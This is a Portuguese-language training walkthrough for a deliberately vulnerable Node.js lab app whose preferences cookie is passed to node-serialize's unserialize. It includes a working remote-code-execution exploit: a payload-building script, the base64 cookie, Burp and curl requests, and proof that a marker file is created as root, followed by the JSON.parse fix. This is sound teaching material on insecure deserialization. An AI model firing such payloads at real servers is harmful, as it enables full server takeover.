# Walkthrough — deserialization-node

A app guarda as suas preferências num cookie chamado `prefs`. Por baixo ela **serializa** o objeto de preferências com a **`node-serialize`** — uma lib npm que transforma um objeto JavaScript em string e o reconstrói depois — e base64-encoda o resultado no cookie. A cada request ela lê o `prefs`, base64-decoda, e chama `serialize.unserialize` na string pra reconstruir o objeto. O problema: **você controla o seu próprio cookie.** E a `node-serialize` não reconstrói só dados — ela sabe reconstruir **funções**, e faz isso rodando **`eval`** no corpo-fonte da função. Um cookie forjado carregando uma função que se auto-invoca faz o `unserialize` rodar o código que você escolher: um comando no servidor.

## 1. Contexto

O único endpoint é o `GET /`. Na primeira visita a app seta um cookie `prefs` e devolve as suas preferências como JSON — `{"theme":"light"}`; todo request seguinte lê esse cookie de volta pra renderizar o seu tema. Essa é a feature inteira; não há formulário nem HTML (você não edita preferências numa UI — o input interessante é o próprio cookie).

Isto é **insecure deserialization**, sob **A08 — Software and Data Integrity Failures**. *Serialization* é transformar um objeto em memória numa string que dá pra guardar ou enviar; *deserialization* é o inverso — reconstruir o objeto a partir dessa string. A categoria é sobre confiar em dados cuja integridade você nunca verificou: aqui a app pega um cookie que o usuário controla e reconstrói um objeto dele com uma lib que pode carregar *código*, não só *dados*. Alguns termos usados abaixo, definidos uma vez:

- **`node-serialize`** — um package npm que (de)serializa objetos JavaScript. Diferente do JSON, ele sabe serializar **funções**.
- **`_$$ND_FUNC$$_`** — o marcador que a `node-serialize` escreve na frente de uma função serializada; ela guarda a função como uma string, o corpo-fonte prefixado com essa tag.
- **`eval`** — a função do JavaScript que roda uma string como código. No `unserialize`, a `node-serialize` reconstrói uma função marcada dando `eval` no corpo-fonte dela.
- **IIFE** (immediately-invoked function expression) — uma função que se chama sozinha: escrever `function(){ ... }()` (repare no `()` no final) faz ela rodar no instante em que é avaliada.
- **RCE** (Remote Code Execution) — rodar comandos arbitrários no servidor.

Não há banco e nem segundo serviço — só a API `vulnerable` em `127.0.0.1:8027` e a `fixed` em `127.0.0.1:8127`. A exploração é feita no Burp (`curl` é o equivalente), mais um script Node curto pra montar o payload. Este átomo é API-only; não há trilha browser. A prova da execução de código é um efeito colateral no servidor (um arquivo marcador), lido com `docker compose exec` — não algo que você vê na resposta HTTP.

## 2. Ache o bug

Abra o [`vulnerable/app.js`](./vulnerable/app.js). O handler de `/` reconstrói as suas preferências assim:

```javascript
const cookie = getCookie(req, "prefs");
...
// VULNERABLE: the "prefs" cookie is base64-decoded and passed straight to serialize.unserialize.
prefs = serialize.unserialize(Buffer.from(cookie, "base64").toString());
```

A string entregue ao `serialize.unserialize` vem direto do seu cookie. A `node-serialize` não é um formato de dados como o JSON — ela sabe reconstruir **funções**. Ela serializa uma função como uma string marcada com `_$$ND_FUNC$$_`, carregando o corpo-fonte da função; no `unserialize`, ao ver essa tag, ela reconstrói a função rodando `eval` no corpo (mais ou menos `eval("(" + fonte + ")")`). Se a fonte for um corpo de função que termina em `()` — uma função que se auto-invoca — o `eval` não só *reconstrói* ela, ele a *roda*, ali mesmo dentro do `unserialize`. Aponte essa função pra `require("child_process").execSync(...)` e desserializar o cookie roda um comando de shell. Pergunta de auditoria: *essa string vem do meu cookie, que EU controlo — e o `unserialize` vai dar `eval` em qualquer função que ela nomear?* — sim.

**Por que o cookie limpo não entrega o formato.** Você poderia esperar denunciar o perigo só decodando o cookie na rede — mas não dá, e vale entender por quê. Pra **dados puros**, a `node-serialize` produz exatamente a mesma string que o JSON: `serialize.serialize({theme:"light"})` é `{"theme":"light"}`, byte a byte o que o `JSON.stringify` daria. Então o cookie `prefs` baseline decoda pra texto simples, JSON-looking, sem marcador nenhum à vista — e é *idêntico* ao que a app fixed seta. O perigo do formato fica **dormente em dados**; ele só **acorda quando uma função é serializada**, e isso só acontece se você puser uma lá. O tell não está na rede — está na fonte (a app chama `serialize.unserialize`, não `JSON.parse`) e no payload que você está prestes a montar (a string `_$$ND_FUNC$$_`). O fix (adiantando): parar de usar um formato que pode carregar comportamento.

O grep barato de primeira passada pra essa classe é qualquer desserializador alimentado com input não-confiável:

```bash
grep -rn 'node-serialize\|\.unserialize(' .
```

## 3. Exploração via Burp Suite

Aponte o Burp pra API vulnerable em `127.0.0.1:8027` e trabalhe do Repeater. Todo request abaixo é um bloco que você cola no Repeater; os mesmos requests rodam no `curl`.

### Passo 1 — Baseline: veja o cookie que a app seta

Mande `GET /` sem cookie `prefs` (a primeira visita não tem):

```
GET / HTTP/1.1
Host: 127.0.0.1:8027
```

A resposta seta um pra você e mostra a feature funcionando:

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: prefs=eyJ0aGVtZSI6ImxpZ2h0In0=; Path=/

{"theme":"light"}
```

Decode esse valor de cookie e você tem texto simples, JSON-looking — sem marcador, nada que grite "node-serialize":

```
$ echo 'eyJ0aGVtZSI6ImxpZ2h0In0=' | base64 -d
{"theme":"light"}
```

Como notado no passo 2, isso é esperado: `node-serialize` e JSON são idênticos pra dados puros. O perigo é invisível até *você* serializar uma função. Daqui você substitui o cookie por um payload seu.

### Passo 2 — Monte o payload

A `node-serialize` vai dar `eval` numa função serializada no `unserialize`, então monte uma cujo corpo se auto-invoca. Este script Node curto imprime o cookie base64 pra mandar — é como você montaria o payload num engagement real:

```javascript
const serialize = require("node-serialize");

// node-serialize serializes this function as a "_$$ND_FUNC$$_"-tagged string.
let s = serialize.serialize({
  rce: function () {
    require("child_process").execSync("touch /tmp/pwned");
  },
});

// Append () to the serialized function body so it self-invokes (an IIFE) on unserialize.
s = s.replace('}"', '}()"');

console.log(Buffer.from(s).toString("base64"));
```

```
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

Decode pra ver exatamente o que você está mandando — `node-serialize` perfeitamente válido, com o marcador revelador e o `()` no final:

```
$ echo 'eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9' | base64 -d
{"rce":"_$$ND_FUNC$$_function () { require(\"child_process\").execSync(\"touch /tmp/pwned\"); }()"}
```

O valor de `rce` é uma string que começa com `_$$ND_FUNC$$_` e termina em `}()`. Montar o payload é seguro: `serialize.serialize` só *registra* o corpo-fonte da função na string; nada roda ainda. O comando roda em quem chamar `serialize.unserialize` nesses bytes — porque no `unserialize` o marcador faz a `node-serialize` dar `eval` na fonte, e o `()` no final faz essa fonte se invocar. Não há nada malformado aqui pra "sanitizar" — é `node-serialize` bem-formado fazendo exatamente o que a lib foi projetada pra fazer.

### Passo 3 — Dispare e prove a execução

Antes de mandar, confirme que o marcador ainda não existe:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

No Repeater, ponha o cookie no seu payload e mande:

```
GET / HTTP/1.1
Host: 127.0.0.1:8027
Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

A resposta parece completamente comum:

```
HTTP/1.1 200 OK
Content-Type: application/json

{"theme":"light"}
```

`{"theme":"light"}`, igual sempre — **nada na resposta revela o ataque.** Essa é a natureza do RCE por deserialization: o comando dispara *dentro* do `serialize.unserialize`, antes de a app fazer qualquer coisa com o resultado, e o handler cai no tema default e responde como se nada tivesse acontecido. A prova é o efeito colateral. Cheque o servidor:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
-rw-r--r-- 1 root root 0 Aug  4 18:12 /tmp/pwned
```

O arquivo existe — o seu cookie fez o servidor rodar `touch /tmp/pwned`, como `root`. O mesmo request no `curl`:

```bash
curl -s http://127.0.0.1:8027/ -H 'Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9'
```

**O que isso realmente é.** Aqui o comando roda dentro de um container isolado e descartável, então `touch`-ar um arquivo vazio é inofensivo — esse isolamento é a rede de proteção deste lab. Num alvo real isto é **Remote Code Execution** completo: comandos arbitrários como o usuário do servidor, na máquina do servidor. O `touch` inócuo é um substituto pro controle total do host. Mantenha os seus payloads demonstrativos — um arquivo marcador basta; nunca há motivo pra apelar pra `rm -rf`, um reverse shell, ou qualquer coisa destrutiva ou de rede, nem num container.

## 4. O que a vuln NÃO é

O exploit é um cookie que você adulterou, então é fácil tirar a lição errada. Isole a causa real:

- **NÃO é "um cookie adulterável" — assinar não resolve.** A reação tentadora é "assina o cookie com um HMAC pra não dar pra forjar". Isso eleva a barra pra *esta* entrega (um cookie forjado é rejeitado), mas não toca a causa: `serialize.unserialize` em dado não-confiável continua sendo RCE. Se a chave de assinatura vazar, ou o dado chegar ao `unserialize` por qualquer outro caminho — um cache, uma fila, um arquivo, um segundo endpoint — você volta pra execução de código. A causa é o **formato**, não a autenticidade do cookie. (Sintoma vs. causa — veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).)
- **NÃO é um bug de validação / sanitização de input.** O cookie malicioso é `node-serialize` *válido* (o decode do Passo 2 prova — um objeto bem-formado com um valor string). Não há input malformado pra rejeitar e nada pra "sanitizar". A própria lib dá `eval` em comportamento carregado em dado bem-formado.
- **NÃO é o `deserialization-pickle` de novo, só que em JavaScript.** É a **mesma classe** (insecure deserialization, A08) com o **mesmo teto** (RCE), mas uma causa concreta diferente. No `deserialization-pickle` o desserializador é o `pickle` da stdlib do Python, disparado pelo `__reduce__` de um objeto; aqui o desserializador é um package npm, a `node-serialize`, disparado por uma função `_$$ND_FUNC$$_` dada `eval`. A mesma classe se materializa por um mecanismo nativo de cada ecossistema — este átomo é o rosto Node dela. (Veja a tabela de contraste abaixo.)

**Prova de isolamento:** mande um cookie *benigno* — o default `{"theme":"light"}`, base64 `eyJ0aGVtZSI6ImxpZ2h0In0=` — pras **duas** apps, e as duas devolvem `{"theme":"light"}` e não tocam em nada. A feature é idêntica (e, como `node-serialize` é igual a JSON pra dados puros, o cookie benigno é literalmente a mesma string nos dois lados). Só o payload `_$$ND_FUNC$$_` as separa: a app vulnerable dá `eval` nele, a fixed não consegue.

A única coisa que **é**: `serialize.unserialize` reconstrói uma função que *você* forjou e dá `eval` nela, porque o formato carrega comportamento. O único fix é usar um formato que carregue **só dados**.

| Eixo | `deserialization-pickle` | `deserialization-node` (este átomo) |
|---|---|---|
| **Runtime / formato** | Python, `pickle` (stdlib) | Node.js, `node-serialize` (package npm) |
| **Onde mora o executor** | `pickle.loads` (biblioteca padrão) | `serialize.unserialize` (dependência npm) |
| **Gatilho de código no dado** | objeto com `__reduce__` → chama a função no unpickle | função com `_$$ND_FUNC$$_` → `eval` no unserialize |
| **Fix** | trocar formato: `pickle` → JSON | trocar formato: `unserialize` → `JSON.parse` |
| **Impacto** | RCE | RCE |

## 5. Impacto

**Remote Code Execution.** O atacante roda comandos arbitrários no servidor através de um único cookie adulterado — o topo da escala de severidade. É o mesmo teto do `deserialization-pickle`, alcançado por um mecanismo diferente (uma lib npm que dá `eval` numa função serializada, em vez de a stdlib chamar uma função nomeada pelo `__reduce__`). Sem overclaim: é RCE como o usuário do container da app (aqui, `root`), o que já significa controle total daquele host.

## 6. Por que o fix funciona

Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança. A app corrigida na porta **8127** lê o mesmo cookie mas (de)serializa com **JSON** — um formato só-dado — e larga a `node-serialize` inteira:

```javascript
prefs = JSON.parse(Buffer.from(cookie, "base64").toString());
```

Rode o exploit contra ela: mande o *mesmo* cookie malicioso:

```
GET / HTTP/1.1
Host: 127.0.0.1:8127
Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

A resposta é o comum `{"theme":"light"}`, e o servidor fica intacto:

```
$ docker compose exec fixed ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

O marcador nunca é criado. O `JSON.parse` no payload só produz um objeto comum onde `rce` é uma **string** inerte — o JSON não tem construção que nomeie uma função, então não há `eval`, nenhum caminho de código pra alcançar. O caso benigno fica inalterado — o default `{"theme":"light"}` faz round-trip pelo JSON exatamente como fazia pela `node-serialize`.

Repare no que o fix *não* é: ele não valida o cookie, não bloqueia a string `_$$ND_FUNC$$_`, não o assina. Assinar (um HMAC) é uma mitigação que vale ter em profundidade — torna a adulteração detectável — mas guarda uma operação insegura em vez de removê-la; a correção de raiz é parar de desserializar dado não-confiável com um formato que carrega comportamento. E como o desserializador perigoso aqui é uma *dependência*, o fix a remove: a app fixed tem zero dependências de runtime. `node-serialize` → `JSON.parse` é a mudança inteira.
